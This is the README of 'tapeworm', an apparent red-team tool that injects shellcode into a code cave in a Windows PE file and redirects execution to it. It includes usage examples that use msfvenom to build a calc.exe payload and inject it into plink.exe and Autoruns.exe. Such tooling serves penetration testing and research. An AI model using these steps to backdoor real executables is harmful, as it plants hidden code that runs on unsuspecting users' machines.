# tapeworm - shellcode injector

Tapeworm injects your shellcode into the code cave at the end of the `.text` section of your PE file. The program will jump to your shellcode and resume execution afterwards. Tapeworm can start your shellcode in a new thread by injecting additional code that calls `CreateThread`.

## Installation

Just install the dependencies:

```bash
pip install -r requirements.txt
```

## Usage

```
usage: ./tapeworm.py [-h] -p PAYLOAD -i INPUT -o OUTPUT [options...]

required named arguments:
  -p PAYLOAD, --payload PAYLOAD
                        shellcode file
  -i INPUT, --input INPUT
                        input PE path
  -o OUTPUT, --output OUTPUT
                        output PE path

options:
  -h, --help            show this help message and exit
  -t, --use-create-thread
                        Run the shellcode in a new thread. Tapeworm will inject an
                        additional shellcode that will run CreateThread. The created
                        thread will run your shellcode immediately
  -a INJECTION_ADDRESS, --injection-address INJECTION_ADDRESS
                        RVA where the jump to the shellcode should be injected. 
                        If not specified the entry point of the PE will be used.
  -e EXTEND_CAVE, --extend-cave EXTEND_CAVE
                        Move the code cave start address EXTEND_CAVE bytes back.
                        This will result in EXTEND_CAVE last bytes of instructions in .text to be overwritten!
                        You may want to try this if the code cave is too small for your shellcode,
                        but it will make the main program break at some unexpected point.
```

### Examples

```bash
# generate some shellcode
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -o payload.bin
# inject it into plink.exe
./tapeworm.py \
  -p payload.bin \
  -i plink.exe \
  -o injected_plink.exe \
  --use-create-thread
```

Sometimes injecting the `jmp <your-shellcode>` instruction at PE's entry point will crash the app if, for example, one of the replaced instructions contains a relocation (tapeworm won't edit them). In that case, run your favorite debugger, find some safe address to inject `jmp` to and pass its RVA via `--injection-address`:

```bash
./tapeworm.py \
  -p payload.bin \
  -i Autoruns.exe \
  -o injected_Autoruns.exe \
  --injection-address 'd34db'
```

If the code cave is too small for your shellcode, you may try to extend it by passing the amount of additional bytes with `-e/--extend-cave`. This will overwrite some instructions at the end of the `.text` section and will probably make the original program crash at some point. Example:

```bash
./tapeworm.py \
  -p calc64.bin \
  -i Autoruns64.exe \
  -o injected_Autoruns64.exe \
  --use-create-thread \
  --injection-address 105014 \
  -e 45
```

If you run tapeworm without `-e` it will prompt you about the minimal value needed to extend the cave.

## What does it do?

It tries to inject your shellcode into the code cave at the end of the `.text` section.

Then it alters a few first instructions of your PE's entry point (or the instructions at the address passed via the `--injection-address` switch) to jump to the shellcode.

After the shellcode is executed, registers and flags are restored and execution is resumed.

If you pass `--use-create-thread`, your shellcode will be ran in a new thread. Tapeworm will inject additional shellcode that runs `CreateThread`.

**NOTE**: The 32-bit asm code that calls `CreateThread` is based on the code from [this blog post by Ilia Dafchev](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html). The 64-bit version is based on the code [this blog post by Nytro Security](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/).
